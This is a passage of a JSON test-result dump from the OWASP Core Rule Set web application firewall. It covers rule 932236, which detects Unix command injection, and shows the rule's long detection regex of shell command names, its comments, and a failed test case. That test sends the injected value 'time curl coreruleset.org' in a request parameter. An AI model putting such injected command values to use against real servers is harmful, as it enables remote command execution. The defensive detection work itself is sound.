[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:7z(?:[\\s\\x0b&\\),<>\\|]|$|[arx](?:[\\s\\x0b&\\),<>\\|]|$))|a(?:a-[^\\s\\x0b]{1,10}\\b|(?:b|w[ks]|l(?:ias|pine)|tobm|xel)(?:[\\s\\x0b&\\),<>\\|]|$)|p(?:t(?:[\\s\\x0b&\\),<>\\|]|$|-get)|parmor_[^\\s\\x0b]{1,10}\\b)|r(?:[\\s\\x0b&\\),<>\\|]|$|j(?:[\\s\\x0b&\\),<>\\|]|$|-register|disp)|(?:p|ch)(?:[\\s\\x0b&\\),<>\\|]|$)|ia2c)|s(?:h(?:[\\s\\x0b&\\),<>\\|]|$)|cii(?:-xfr|85)|pell)|dd(?:group|user)|getty|nsible|u(?:ditctl|repot|search))|b(?:z(?:(?:z|c(?:at|mp))(?:[\\s\\x0b&\\),<>\\|]|$)|diff|e(?:grep|xe(?:[\\s\\x0b&\\),<>\\|]|$))|f?grep|ip2(?:[\\s\\x0b&\\),<>\\|]|$|recover)|less|more)|a(?:s(?:e(?:32|64|n(?:ame(?:[\\s\\x0b&\\),<>\\|]|$)|c))|h(?:[\\s\\x0b&\\),<>\\|]|$))|tch(?:[\\s\\x0b&\\),<>\\|]|$))|lkid(?:[\\s\\x0b&\\),<>\\|]|$)|pftrace|r(?:eaksw|(?:idge|wap)(?:[\\s\\x0b&\\),<>\\|]|$))|sd(?:cat|iff|tar)|u(?:iltin|n(?:dler(?:[\\s\\x0b&\\),<>\\|]|$)|zip2)|s(?:ctl|ybox))|y(?:ebug|obu(?:[\\s\\x0b&\\),<>\\|]|$)))|c(?:[89]9(?:[\\s\\x0b&\\),<>\\|]|$|-gcc)|(?:a(?:t|ncel|psh)|c|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|p(?:[\\s\\x0b&\\),<>\\|]|$|(?:an|io)(?:[\\s\\x0b&\\),<>\\|]|$)|ulimit)|s(?:(?:h|cli)(?:[\\s\\x0b&\\),<>\\|]|$)|plit|vtool)|u(?:(?:t|rl)(?:[\\s\\x0b&\\),<>\\|]|$)|psfilter)|ertbot|h(?:(?:(?:att|di)r|mod|o(?:om|wn)|root|sh)(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:ck_(?:by_ssh|cups|log|memory|raid|s(?:sl_cert|tatusfile))|f(?:[\\s\\x0b&\\),\\-<>\\|]|$))|(?:flag|pas)s|g(?:passwd|rp(?:[\\s\\x0b&\\),<>\\|]|$)))|lang(?:\\+\\+|[\\s\\x0b&\\),<>\\|]|$)|o(?:bc(?:[\\s\\x0b&\\),<>\\|]|$|run)|lumn(?:[\\s\\x0b&\\),<>\\|]|$)|m(?:m(?:[\\s\\x0b&\\),<>\\|]|$|and(?:[\\s\\x0b&\\),<>\\|]|$))|p(?:oser|ress)(?:[\\s\\x0b&\\),<>\\|]|$))|proc|w(?:say|think))|r(?:ash(?:[\\s\\x0b&\\),<>\\|]|$)|ontab))|d(?:(?:[dfu]|i(?:(?:alo)?g|ff)|ash|vips)(?:[\\s\\x0b&\\),<>\\|]|$)|hclient|m(?:esg(?:[\\s\\x0b&\\),<>\\|]|$)|idecode|setup)|o(?:(?:as|ne)(?:[\\s\\x0b&\\),<>\\|]|$)|cker(?:[\\s\\x0b&\\),\\-<>\\|]|$)|sbox)|pkg(?:[\\s\\x0b&\\),\\-<>\\|]|$))|e(?:(?:b|qn|cho|fax|grep|macs|val)(?:[\\s\\x0b&\\),<>\\|]|$)|n(?:v(?:[\\s\\x0b&\\),<>\\|]|$|-update)|d(?:if|sw)(?:[\\s\\x0b&\\),<>\\|]|$))|s(?:[\\s\\x0b&\\),<>\\|]|$|(?:h|ac)(?:[\\s\\x0b&\\),<>\\|]|$))|x(?:[\\s\\x0b&\\),<>\\|]|$|(?:ec|p(?:and|(?:ec|or)t|r))(?:[\\s\\x0b&\\),<>\\|]|$)|iftool)|2fsck|asy_install)|f(?:(?:c|mt|etch|lock|unction)(?:[\\s\\x0b&\\),<>\\|]|$)|d(?:[\\s\\x0b&\\),<>\\|]|$|(?:find|isk)(?:[\\s\\x0b&\\),<>\\|]|$)|u?mount)|g(?:[\\s\\x0b&\\),<>\\|]|$|rep(?:[\\s\\x0b&\\),<>\\|]|$))|i(?:[\\s\\x0b&\\),<>\\|]|$|letest|(?:n(?:d|ger)|sh)(?:[\\s\\x0b&\\),<>\\|]|$))|tp(?:[\\s\\x0b&\\),<>\\|]|$|stats|who)|acter|o(?:ld(?:[\\s\\x0b&\\),<>\\|]|$)|reach)|ping(?:[\\s\\x0b&\\),6<>\\|]|$))|g(?:c(?:c[^\\s\\x0b]{1,10}\\b|ore(?:[\\s\\x0b&\\),<>\\|]|$))|(?:db|i(?:t|mp|nsh)|o|pg|awk|z(?:cat|exe|ip))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:m(?:[\\s\\x0b&\\),<>\\|]|$)|ni(?:e(?:[\\s\\x0b&\\),<>\\|]|$)|soimage)|t(?:cap|facl(?:[\\s\\x0b&\\),<>\\|]|$)))|hc(?:[\\s\\x0b&\\),<>\\|]|$|-(?:[\\s\\x0b&\\),<>\\|]|$)|i(?:[\\s\\x0b&\\),\\-<>\\|]|$))|r(?:c(?:[\\s\\x0b&\\),<>\\|]|$|at(?:[\\s\\x0b&\\),<>\\|]|$))|ep(?:[\\s\\x0b&\\),<>\\|]|$)|oup(?:[\\s\\x0b&\\),<>\\|]|$|mod))|tester|unzip)|h(?:(?:d|up|i(?:ghlight|story))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:ad(?:[\\s\\x0b&\\),<>\\|]|$)|xdump)|ost(?:id|name)|ping3|t(?:digest|op(?:[\\s\\x0b&\\),<>\\|]|$)|passwd))|i(?:p(?:[\\s\\x0b&\\),<>\\|]|$|6?tables|config|p(?:eveprinter|find|tool))|(?:rb|conv)(?:[\\s\\x0b&\\),<>\\|]|$)|f(?:config|top(?:[\\s\\x0b&\\),<>\\|]|$))|onice|spell)|j(?:(?:js|q|exec)(?:[\\s\\x0b&\\),<>\\|]|$)|o(?:(?:bs|in)(?:[\\s\\x0b&\\),<>\\|]|$)|urnalctl)|runscript)|k(?:s(?:h(?:[\\s\\x0b&\\),<>\\|]|$)|shell)|ill(?:[\\s\\x0b&\\),<>\\|]|$|all)|nife(?:[\\s\\x0b&\\),<>\\|]|$))|l(?:d(?:[\\s\\x0b&\\),<>\\|]|$|d(?:[\\s\\x0b&\\),<>\\|]|$)|config)|(?:[np]|inks|ynx)(?:[\\s\\x0b&\\),<>\\|]|$)|s(?:[\\s\\x0b&\\),<>\\|]|$|(?:-F|cpu|hw|mod|of|pci|usb)(?:[\\s\\x0b&\\),<>\\|]|$)|b_release)|ua(?:[\\s\\x0b&\\),<>\\|]|$|(?:la)?tex)|z(?:4(?:[\\s\\x0b&\\),<>\\|]|$|c(?:[\\s\\x0b&\\),<>\\|]|$|at))|(?:c(?:at|mp))?(?:[\\s\\x0b&\\),<>\\|]|$)|diff|[ef]?grep|less|m(?:a(?:[\\s\\x0b&\\),<>\\|]|$|dec|info)|ore))|a(?:st(?:[\\s\\x0b&\\),<>\\|]|$|comm(?:[\\s\\x0b&\\),<>\\|]|$)|log(?:in)?)|tex(?:[\\s\\x0b&\\),<>\\|]|$))|ess(?:[\\s\\x0b&\\),<>\\|]|$|echo|(?:fil|pip)e)|ftp(?:[\\s\\x0b&\\),<>\\|]|$|get)|o(?:(?:ca(?:l|te)|ok)(?:[\\s\\x0b&\\),<>\\|]|$)|g(?:inctl|(?:nam|sav)e)|setup)|trace|wp-(?:d(?:ownload|ump)|mirror|request))|m(?:a(?:(?:n|il[qx]|ke|wk)(?:[\\s\\x0b&\\),<>\\|]|$)|ster\\.passwd)|(?:tr|v|utt)(?:[\\s\\x0b&\\),<>\\|]|$)|k(?:(?:dir|nod)(?:[\\s\\x0b&\\),<>\\|]|$)|fifo|temp)|locate|o(?:squitto|unt(?:[\\s\\x0b&\\),<>\\|]|$))|sg(?:attrib|c(?:at|onv)|filter|merge|uniq)|ysql(?:[\\s\\x0b&\\),<>\\|]|$|admin|dump(?:slow)?|hotcopy|show))|n(?:c(?:[\\s\\x0b&\\),<>\\|]|$|\\.(?:openbsd|traditional)|at(?:[\\s\\x0b&\\),<>\\|]|$))|e(?:t(?:[\\s\\x0b&\\),<>\\|]|$|(?:c|st)at|kit-ftp|plan)|ofetch)|(?:l|p(?:m|ing)|a(?:no|sm|wk)|ice|o(?:de|hup)|roff)(?:[\\s\\x0b&\\),<>\\|]|$)|m(?:[\\s\\x0b&\\),<>\\|]|$|ap(?:[\\s\\x0b&\\),<>\\|]|$))|s(?:enter|lookup|tat(?:[\\s\\x0b&\\),<>\\|]|$)))|o(?:(?:d|ctave)(?:[\\s\\x0b&\\),<>\\|]|$)|nintr|p(?:en(?:ssl|v(?:pn|t))|kg(?:[\\s\\x0b&\\),<>\\|]|$)))|p(?:a(?:(?:x|rted|tch)(?:[\\s\\x0b&\\),<>\\|]|$)|s(?:swd|te(?:[\\s\\x0b&\\),<>\\|]|$)))|d(?:b(?:[\\s\\x0b&\\),<>\\|]|$|2mb|3(?:[\\s\\x0b&\\),\\.<>\\|]|$))|f(?:la)?tex|ksh(?:[\\s\\x0b&\\),<>\\|]|$))|f(?:[\\s\\x0b&\\),<>\\|]|$|tp(?:[\\s\\x0b&\\),<>\\|]|$))|i(?:c(?:[\\s\\x0b&\\),<>\\|]|$|o(?:[\\s\\x0b&\\),<>\\|]|$))|p(?:[^\\s\\x0b]{1,10}\\b|[\\s\\x0b&\\),<>\\|]|$)|dstat|(?:gz|ng6?)(?:[\\s\\x0b&\\),<>\\|]|$))|k(?:g(?:[\\s\\x0b&\\),<>\\|]|$|_?info)|exec|ill(?:[\\s\\x0b&\\),<>\\|]|$))|r(?:[\\s\\x0b&\\),<>\\|]|$|y(?:[\\s\\x0b&\\),<>\\|]|$)|int(?:env|f(?:[\\s\\x0b&\\),<>\\|]|$)))|t(?:x(?:[\\s\\x0b&\\),<>\\|]|$)|ar(?:[\\s\\x0b&\\),<>\\|]|$|diff|grep))|wd(?:[\\s\\x0b&\\),<>\\|]|$|\\.db)|(?:xz|grep|opd|u(?:ppet|shd))(?:[\\s\\x0b&\\),<>\\|]|$)|er(?:(?:f|ms)(?:[\\s\\x0b&\\),<>\\|]|$)|l(?:5?(?:[\\s\\x0b&\\),<>\\|]|$)|sh))|hp(?:-cgi|[57](?:[\\s\\x0b&\\),<>\\|]|$))|s(?:(?:ed|ql)(?:[\\s\\x0b&\\),<>\\|]|$)|ftp)|y(?:3?versions|thon(?:[23]|[^\\s\\x0b]{1,10}\\b)))|r(?:(?:a(?:r|k[eu])|bash|nano|oute|vi(?:ew|m))(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:[\\s\\x0b&\\),<>\\|]|$|p(?:[\\s\\x0b&\\),<>\\|]|$))|e(?:d(?:[\\s\\x0b&\\),<>\\|]|$|carpet(?:[\\s\\x0b&\\),<>\\|]|$))|(?:v|boot|place)(?:[\\s\\x0b&\\),<>\\|]|$)|a(?:delf|lpath)|stic)|m(?:[\\s\\x0b&\\),<>\\|]|$|t(?:[\\s\\x0b&\\),<>\\|]|$|-(?:dump|tar))|dir(?:[\\s\\x0b&\\),<>\\|]|$)|user)|pm(?:[\\s\\x0b&\\),<>\\|]|$|db(?:[\\s\\x0b&\\),<>\\|]|$)|(?:quer|verif)y)|l(?:ogin|wrap)|sync(?:-ssl|[\\s\\x0b&\\),<>\\|]|$)|u(?:by[^\\s\\x0b]{1,10}\\b|n(?:-(?:mailcap|parts)|c(?:[\\s\\x0b&\\),<>\\|]|$))))|s(?:(?:c(?:p|hed|ript)|g|ash|diff|(?:ft|na)p|l(?:eep|sh))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:(?:d|ndmail|rvice)(?:[\\s\\x0b&\\),<>\\|]|$)|t(?:[\\s\\x0b&\\),<>\\|]|$|arch|cap|env|facl(?:[\\s\\x0b&\\),<>\\|]|$)|sid))|h(?:[\\s\\x0b&\\),<>\\|]|$|\\.distrib|(?:adow|ells|u(?:f|tdown))(?:[\\s\\x0b&\\),<>\\|]|$))|sh(?:[\\s\\x0b&\\),<>\\|]|$|-(?:a(?:dd|gent)|copy-id|key(?:ge|sca)n)|pass)|u(?:[\\s\\x0b&\\),<>\\|]|$|do(?:-rs|[\\s\\x0b&\\),<>_\\|]|$|edit|replay))|vn(?:[\\s\\x0b&\\),<>\\|]|$|a(?:dmin|uthz)|bench|dumpfilter|fsfs|look|mucc|rdump|s(?:erve|ync)|version)|mbclient|o(?:cat(?:[\\s\\x0b&\\),<>\\|]|$)|elim)|p(?:lit(?:[\\s\\x0b&\\),<>\\|]|$)|wd\\.db)|qlite3|t(?:art-stop-daemon|d(?:buf|err|in(?:[\\s\\x0b&\\),<>\\|]|$)|out)|r(?:ace|ings(?:[\\s\\x0b&\\),<>\\|]|$)))|ys(?:ctl|tem(?:ctl|d-resolve)))|t(?:a(?:[cr](?:[\\s\\x0b&\\),<>\\|]|$)|il(?:[\\s\\x0b&\\),<>\\|]|$|f(?:[\\s\\x0b&\\),<>\\|]|$))|skset)|(?:bl|o(?:p|uch)|ftp|mux)(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:p(?:[\\s\\x0b&\\),<>\\|]|$|dump|ing|traceroute)|l?sh(?:[\\s\\x0b&\\),<>\\|]|$))|e(?:[ex](?:[\\s\\x0b&\\),<>\\|]|$)|lnet)|i(?:c(?:[\\s\\x0b&\\),<>\\|]|$)|medatectl)|r(?:aceroute6?|off(?:[\\s\\x0b&\\),<>\\|]|$))|shark)|u(?:dp(?:[\\s\\x0b&\\),<>\\|]|$)|l(?:[\\s\\x0b&\\),<>\\|]|$|imit(?:[\\s\\x0b&\\),<>\\|]|$))|n(?:(?:compress|iq|rar|s(?:et|hare)|xz)(?:[\\s\\x0b&\\),<>\\|]|$)|expand|l(?:ink(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:4(?:[\\s\\x0b&\\),<>\\|]|$)|ma))|pigz|z(?:ip(?:[\\s\\x0b&\\),<>\\|]|$)|std))|pdate-alternatives|ser(?:(?:ad|mo)d|del)|u(?:de|en)code)|v(?:i(?:m(?:[\\s\\x0b&\\),<>\\|]|$|diff)|(?:gr|pw|rsh)(?:[\\s\\x0b&\\),<>\\|]|$)|sudo(?:-rs)?)|algrind|olatility(?:[\\s\\x0b&\\),<>\\|]|$))|w(?:(?:3m|c|atch|get)(?:[\\s\\x0b&\\),<>\\|]|$)|h(?:iptail(?:[\\s\\x0b&\\),<>\\|]|$)|oami)|i(?:reshark|sh(?:[\\s\\x0b&\\),<>\\|]|$)))|x(?:(?:(?:x|pa)d|args|term)(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:[\\s\\x0b&\\),<>\\|]|$|c(?:at|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|d(?:ec(?:[\\s\\x0b&\\),<>\\|]|$)|iff)|[ef]?grep|less|more)|e(?:latex|tex(?:[\\s\\x0b&\\),<>\\|]|$))|mo(?:dmap|re(?:[\\s\\x0b&\\),<>\\|]|$)))|y(?:um|arn|elp)(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:ip(?:[\\s\\x0b&\\),<>\\|]|$|c(?:loak|mp)|details|grep|info|(?:merg|not)e|split|tool)|s(?:h(?:[\\s\\x0b&\\),<>\\|]|$)|oelim|td(?:[\\s\\x0b&\\),<>\\|]|$|(?:ca|m)t|grep|less))|athura|(?:c(?:at|mp)|diff|grep|less|run)(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:grep|ro(?:[\\s\\x0b&\\),<>\\|]|$))|fgrep|mo(?:dload|re(?:[\\s\\x0b&\\),<>\\|]|$))|ypper))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932236
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection (command without evasion)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932236",
    "test_id" : 42,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932236.yaml",
    "description" : "Remote Command Injection test for BB finding 935E1D91",
    "cause" : "failed expect_id check: 932236 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 42,
      "desc" : "Remote Command Injection test for BB finding 935E1D91",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=time+curl+coreruleset.org",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932236 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932236,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is a stricter sibling of rules 932230, 932235, 932250, 932260."
        }, {
          "type" : "Comment",
          "text" : " This stricter sibling detects Unix RCE with and without prefix and words of any length."
        }, {
          "type" : "Comment",
          "text" : " It uses the same regex."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932236.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932236"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:^|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)